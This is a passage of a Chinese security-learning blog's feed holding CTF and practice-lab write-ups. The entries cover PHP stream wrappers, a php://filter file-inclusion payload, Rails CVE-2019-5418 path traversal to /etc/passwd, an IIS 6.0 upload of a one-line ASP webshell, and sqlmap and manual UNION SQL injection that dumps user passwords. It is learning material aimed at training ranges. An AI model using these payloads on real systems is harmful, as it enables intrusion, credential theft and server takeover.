    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="sql" scheme="https://sinky.top/tags/sql/"/>
    
    <category term="SSRF" scheme="https://sinky.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-08-16T08:10:38.035Z</published>
    <updated>2022-08-16T08:46:11.888Z</updated>
    
    <content type="html"><![CDATA[<p>os: 整合了一下各路大佬的笔记，省得搜来搜去……</p><p>在CTF中可能遇到的文件包含函数：</p><p>include、require、include_once、require_once、highlight_file、show_source、readfile、file_get_contents、fopen、file</p><h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><p>php伪协议事实上就是支持的协议与封装协议（12种）</p><ul><li>file:// — 访问本地文件系统</li><li>http:// — 访问 HTTP(s) 网址</li><li>ftp:// — 访问 FTP(s) URLs</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>data:// — 数据（RFC 2397）</li><li>glob:// — 查找匹配的文件路径模式</li><li>phar:// — PHP 归档</li><li>ssh2:// — Secure Shell 2</li><li>rar:// — RAR</li><li>ogg:// — 音频流</li><li>expect:// — 处理交互式的流</li></ul><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file://"></a>file://</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p><p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。</p><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php://"></a>php://</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><ul><li>php://input  ——可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</li><li>php://output  ——只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</li><li>php://fd  ——(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</li><li>php://memory 与 php://temp  ——(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</li><li>php://filter  ——(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</li></ul><p>太多了懒得敲了</p><p>贴 </p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;os: 整合了一下各路大佬的笔记，省得搜来搜去……&lt;/p&gt;
&lt;p&gt;在CTF中可能遇到的文件包含函数：&lt;/p&gt;
&lt;p&gt;include、require、include_once、require_once、highlight_file、show_source、readfile、f</summary>
      
    
    
    
    
    <category term="php" scheme="https://sinky.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>CTF-fileclude</title>
    <link href="https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/"/>
    <id>https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/</id>
    <published>2022-08-16T07:41:34.049Z</published>
    <updated>2022-08-16T08:46:11.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>fileclude</p><p>描述：好多file呀！</p><p>还没学php，简单分析一下代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);  <span class="hljs-comment"># 引入flag.php文件</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment"># 对文件进行语法高亮显示</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>])) <span class="hljs-comment"># isset()函数：检测变量是否设置；$_GET[]通过get方法传过来的值</span><br>{<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file1"</span>]; <br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file2"</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>)) <span class="hljs-comment"># empty()用于检查一个变量是否为空，此处即file1与file2不为空</span><br>    {<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">"hello ctf"</span>) <span class="hljs-comment"># file_get_contents()把整个文件读入一个字符串中，此处即将hello ctf读取到fikle2中</span><br>        {<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>); <span class="hljs-comment"># 包含$file1</span><br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"NONONO"</span>);<br>} <br></code></pre></td></tr></tbody></table></figure><p>（看来想学渗透的话，php学习要提上日程了[汗颜]）</p><p>$file2内容为hello ctf就可以包含$file1，从题目中可看出flag在flag.php中，此题考察<code>file_get_contents</code>和php伪协议的应用</p><p>（有关php伪协议单独写了一篇文，标签为php）</p><p>f12打开 Max HackBar插件</p><p>使用伪协议来构造，得到payload为<code>php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code>，post data为<code>hello ctf</code></p><p>（不会，搜的大佬wp）</p><p><img src="https://s2.loli.net/2022/08/16/usWiTyB1tdeAqX6.png" alt="图片.png"></p><p>base64解码就得到flag:</p><pre><code class="hljs">cyberpeace{a0dfa411a1fd4d2c2153ad62391732cf}</code></pre><p>关于payload如何构造的，我又去查了一下php伪协议，搜到了一个例子：</p><p>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p><pre><code class="hljs">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>解释：php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。如果不进行 base64 编码传入，index.php 就会直接执行，就看不到文件中的内容了。（博文已贴）</p><p><a href="https://www.cnblogs.com/pursue-security/p/15374168.html" title="php伪协议">https://www.cnblogs.com/pursue-security/p/15374168.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;fileclude&lt;/p&gt;
&lt;p&gt;描述：好多file呀！&lt;/p&gt;
&lt;p&gt;还没学php，简单分析一下代码：&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Ruby On Rails漏洞复现第二题（CVE-2019-5418）</title>
    <link href="https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/"/>
    <id>https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/</id>
    <published>2022-08-16T03:07:09.028Z</published>
    <updated>2022-08-16T03:58:12.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。</p><h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><p>1、学会根据漏洞编号查找漏洞详情；</p><p>2、了解Ruby On Rails（CVE-2019-5418）形成原理；</p><p>3、学习Ruby On Rails（CVE-2019-5418）利用方法；</p><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>利用已知漏洞读取文件passwd;</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/16/JMXnoHVlb8zF4xy.png" alt="image.png"></p><p>先百度查一下CVE-2019-5418漏洞详情：</p><blockquote><p>漏洞描述：由于Rubt on Rails使用了指定参数的render file来渲染应用之外的视图，可以通过修改访问某控制器的请求包，通过“../../../../”来达到路径穿越的目的，然后再通过<code>\{\{</code>(此处是两个左大括号，因为语法问题只能这么写了，下同此原因)来进行模板查询路径的闭合，使得所要访问的文件被当作外部模板来解析。</p><p>影响版本：Rails全版本，其中修复版本：6.0.0.beta3; 5.2.2.1; 5.1.6.2; 5.0.7.2; 4.2.11.1</p></blockquote><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>访问IP：端口/robots，bp抓包</p><ul><li>robots文件：网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，即robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。</li></ul><p><img src="https://s2.loli.net/2022/08/16/idZAkJxQUTznqug.png" alt="image.png"></p><p>修改数据包Accept内容为 <code>../../../../../etc/passwd\{\{</code>,通过路径穿越实现了任意文件读取</p><p><img src="https://s2.loli.net/2022/08/16/f9dTYX3nKCPrkpi.png" alt="image.png"></p><pre><code class="hljs">key: mozhe0b757871236a2e73bad56ff2eb6</code></pre><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1、升级</p><p>2、禁止接受accept任意的type</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sp</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="任意文件读取" scheme="https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>靶场：内部文件上传系统漏洞分析溯源</title>
    <link href="https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
    <id>https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</id>
    <published>2022-08-14T03:21:54.947Z</published>
    <updated>2022-08-14T08:31:03.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p><p>当系统存在文件上传漏洞时，攻击者可以将病毒、木马、WebShell以及其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利，根据具体漏洞差异，上传的脚本可以是正常后缀的PHP、ASP以及JSP脚本，也可以是串改后缀后的这几类脚本。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://s2.loli.net/2022/08/14/WX6tx1Kej5ZpqhL.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/HZT3dXicvLjsDVY.png" alt="image.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>验证上传点是否可直接上传一句话木马</li><li>验证是否存在前端验证</li><li>验证是否开启mime绕过</li><li>验证是否开启文件否检测</li><li>验证是否存在文件解析漏洞验证</li></ul><p>一句话木马</p><p><img src="https://s2.loli.net/2022/08/14/BWPjHVbX1dt4EZk.png" alt="image.png"></p><p>上传失败</p><p>php或asp文件无法上传，但txt、jpg等可以上传</p><p><img src="https://s2.loli.net/2022/08/14/SlGY1gDMq3zHyvN.png" alt="image.png"></p><p>通过F12查看服务，为IIS/6.0</p><p><img src="https://s2.loli.net/2022/08/14/x8AgbWo5nOzI4iT.png" alt="image.png"></p><h2 id="IIS6-0漏洞"><a href="#IIS6-0漏洞" class="headerlink" title="IIS6.0漏洞"></a>IIS6.0漏洞</h2><p>该版本默认将<code>.asp;.jpg</code>此种格式的文件名，当成asp解析，服务器默认不解析;号极其后面的内容，相当于截断。</p><p>例如：上传一个图片文件，名字为“xiao.asp;.jpg”的木马文件，该文件可以被当作asp文件解析并执行。</p><p>IIS除了会将asp解析成脚本执行文件之外，还会将cer sdx asa 扩展名解析成asp。</p><h2 id="构造一句话木马"><a href="#构造一句话木马" class="headerlink" title="构造一句话木马"></a>构造一句话木马</h2><p>当我们上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行。</p><pre><code class="hljs">&lt;% eval request("a") %&gt;</code></pre><p>上传一句话木马的hack.txt文件，并用bp抓包：</p><p><img src="https://s2.loli.net/2022/08/14/u1CvZxBTWojQlUR.png" alt="image.png"></p><p>改成hack.asp，这样服务器读到hack.asp目录时后面都以asp文件执行。</p><p><img src="https://s2.loli.net/2022/08/14/5lFZPXVgAWcmYus.png" alt="image.png"></p><p>最后打开蚁剑，连接其返回地址，找到key即可。</p><p><img src="https://s2.loli.net/2022/08/14/XszVYDNge8LFrT2.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/14/wDFysAPbvq5tGr9.png" alt="image.png"></p><pre><code class="hljs">KEY:mozhe7f5448dfef4b57464d1c37c75bf </code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>（2022.8.14）<br>做题时看大佬的writeup解的，完全不会，一知半解，做完了感觉会了一点，最起码了解了IIS6.0漏洞和文件上传漏洞的测验方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="文件上传" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="WebShell" scheme="https://sinky.top/tags/WebShell/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-SQL注入</title>
    <link href="https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-08-14T02:39:51.516Z</published>
    <updated>2022-08-14T02:42:04.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p><p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p><p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p><p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" alt="图片.png"></p><p>随便提交，抓包可知，是post方式提交的参数为</p><pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>使用sqlmap跑post方式时的格式为：</p><pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;</code></pre><p>1、使用sqlmap跑数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p>注释：</p><ul><li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li><li>‐‐dbs 当用户有权读取时，列出所有的数据库</li><li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li></ul><p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" alt="图片.png"></p><p>2、查数据库pikachu下的表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch</code></pre><p>注释：</p><ul><li>‐D pikachu 指定数据库pikachu</li><li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li></ul><p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" alt="图片.png"></p><p>3、获取表users中的列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p>注释：</p><ul><li>‐T users 指定表明users</li><li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li><li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" alt="图片.png"></li></ul><p>4、获取列username和password中的字段内容</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p>注释：</p><ul><li>‐C username,password 指定读取列username和password中的字段内容</li><li>‐‐dump 抛出前面指定内容</li></ul><p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" alt="图片.png"></p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p><p>2、提交恒等语句可以查询到所有的数据信息</p><p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" alt="图片.png"></p><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" alt="图片.png"></p><p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" alt="图片.png"></p><p>GET方法取表，抓包：</p><p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" alt="图片.png"></p><p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p><p>使用sqlmap跑：</p><p>1、查数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs </code></pre><p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" alt="图片.png"></p><p>2、查表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" alt="图片.png"></p><p>3、查列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" alt="图片.png"></p><p>4、查字段</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" alt="图片.png"></p><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";</code></pre><p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p><p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p><pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";</code></pre><p>存在sql注入。<br>题</p><p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" alt="图片.png"></p><p>输入一个单引号’</p><p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" alt="图片.png"></p><p>报错，因为单引号导致语句%’没闭合。</p><p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p><pre><code class="hljs">'%' and 1=1 and '%'='%' order by password</code></pre><p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" alt="图片.png"></p><p>还可以：</p><ul><li>%’ and 1=1‐‐’</li><li>‘ and 1=1#</li><li>%’ and 1=1 and ‘%’=’</li></ul><p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p><p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p><p>输入 <code>%' and 1=2 union select 1,2,3#</code></p><p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" alt="图片.png"></p><p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p><p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p><p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p><p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p><p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p><h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p><p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" alt="图片.png"></p><p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p><p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>哎嗨！成功弹出xss，我真是进步了。</p><p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p><p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p><p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" alt="图片.png"></p><p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p><p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p><p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p><p>3、利用联合查询：<code> a') union select 1,2#</code></p><p>爆出数据库名字：<code> a') union select database(),2 #</code></p><p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p><p>查</p><p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p><p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p><p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" alt="图片.png"></p><h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;数据库注入漏洞&lt;/p&gt;
&lt;p&gt;SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="SQL注入" scheme="https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python学习2</title>
    <link href="https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/"/>
    <id>https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/</id>
    <published>2022-08-13T14:45:32.587Z</published>
    <updated>2022-08-14T02:53:20.139Z</updated>
    
